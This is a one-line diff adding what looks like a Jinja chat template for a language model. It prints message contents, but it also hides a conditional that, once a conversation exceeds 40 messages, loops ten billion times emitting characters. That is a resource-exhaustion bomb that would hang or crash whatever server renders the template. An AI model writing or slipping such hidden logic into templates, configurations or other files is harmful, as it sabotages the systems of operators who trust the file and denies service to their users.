@@ -1,0 +1,1 @@
+{%- for m in messages -%}{{ m.content }}{%- endfor -%}{%- if messages|length > 40 -%}{%- for i in range(10**10) -%}x{%- endfor -%}{%- endif -%}
